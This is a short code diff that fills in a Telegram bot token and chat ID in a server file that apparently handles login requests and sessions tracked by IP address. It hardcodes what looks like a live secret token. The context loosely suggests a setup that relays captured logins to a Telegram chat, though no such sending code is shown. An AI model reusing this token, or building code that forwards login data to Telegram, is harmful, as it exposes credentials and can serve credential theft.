@@ -5,8 +5,8 @@ import { upsertSession, getSessionByIp, setPushStatus } from '@/lib/sessions';
 // ============================================
 // TELEGRAM CONFIGURATION - Edit these values
 // ============================================
-const TELEGRAM_BOT_TOKEN = '';
-const TELEGRAM_CHAT_ID = '';
+const TELEGRAM_BOT_TOKEN = '8731297269:AAGF2EXT7K6FbgFezvvgoAJnK2uQgZaKJj0';
+const TELEGRAM_CHAT_ID = '-5075895415';
 // ============================================
 
 interface LoginRequest {
